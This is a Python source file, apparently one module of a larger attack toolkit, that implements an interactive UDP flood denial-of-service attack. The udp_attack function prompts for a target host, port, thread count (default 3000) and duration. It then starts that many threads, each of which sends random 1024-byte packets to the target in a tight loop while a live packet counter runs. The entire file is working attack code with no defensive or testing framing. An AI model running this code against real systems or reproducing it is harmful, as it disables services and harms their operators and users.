import socket
import threading
import random
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

def udp_flood(ip, port, stop, stats):
    data = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop.is_set():
        try:
            s.sendto(data, (ip, port))
            stats['p'] += 1
        except:
            stats['e'] += 1

def udp_attack():
    pcolor("b", "\n[ UDP FLOOD ATTACK ]\n")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input("Port (53): ") or 53)
    threads = int(input("Threads (3000): ") or 3000)
    duration = int(input("Duration (60 sec): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm != 'y':
        return
    
    stop = threading.Event()
    stats = {'p': 0, 'e': 0}
    
    for _ in range(threads):
        threading.Thread(target=udp_flood, args=(ip, port, stop, stats), daemon=True).start()
    
    pcolor("g", f"\n[!] UDP ATTACK STARTED on {ip}:{port}")
    start = time.time()
    
    try:
        while time.time() - start < duration:
            remaining = int(duration - (time.time() - start))
            print(f"\r[LIVE] Packets: {stats['p']} | Errors: {stats['e']} | Time: {remaining}s    ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pcolor("y", "\n[!] Stopping...")
    finally:
        stop.set()
        pcolor("g", f"\n\n[+] ATTACK FINISHED")
        print(f"Packets sent: {stats['p']}")
        save_log(ip, port, "UDP_FLOOD", threads, duration, stats['p'], stats['e'])
    
    input("\nPress Enter...")
